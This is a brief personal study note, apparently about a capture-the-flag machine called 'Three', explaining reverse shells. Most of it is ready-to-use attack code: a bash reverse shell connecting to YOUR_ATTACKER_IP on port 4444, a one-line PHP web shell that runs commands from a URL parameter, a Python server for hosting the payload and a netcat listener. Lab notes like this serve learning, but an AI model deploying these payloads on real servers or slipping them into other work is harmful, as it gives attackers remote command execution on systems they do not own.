Reverse shell is when you have access to input files into the server and wait or trigger this file to get a shell inside the system.

## Basic Payloads
In the case of [[Three]], we first utilized a PHP file that makes us able to use this file to use commands in the URL parameter. This way we can curl this file into the file of the server and access it. 
payload.sh
```sh
#!/bin/bash
bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1

# needs to have a netcat listener on that specific port.
```

shell.php
```php
<?php system($_GET["cmd"]); ?>
```
This file will utilize the cmd URL parameter to use commands within the server.

```python
# this is where the server is going to get the payload.sh from by curling it and triggering our shell.
python3 -m http.server portnumber

#this is the netcat listener that will allow us to get in the shell.
nc -nvlp 4444
```